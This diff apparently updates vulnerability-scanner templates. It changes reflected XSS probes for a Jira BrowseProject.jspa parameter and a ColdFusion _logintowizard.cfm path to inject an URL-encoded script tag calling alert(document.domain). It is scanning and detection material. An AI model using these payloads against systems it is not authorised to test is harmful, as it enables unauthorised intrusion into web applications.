@@ -134,7 +134,7 @@
             {
               "type": "word",
               "words": [
-                "\"><script>alert('{{randstr}}')</script>"
+                "\"><script>alert(document.domain)</script>"
               ]
             },
             {
@@ -154,7 +154,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/jira/secure/BrowseProject.jspa?id=\"><script>alert('{{randstr}}')</script>"
+            "{{BaseURL}}/jira/secure/BrowseProject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e"
           ]
         }
       ]
@@ -582,7 +582,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/CFIDE/wizards/common/_logintowizard.cfm?></script><script>alert(document.domain)</script>"
+            "{{BaseURL}}/CFIDE/wizards/common/_logintowizard.cfm?%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
           ]
         }
       ]
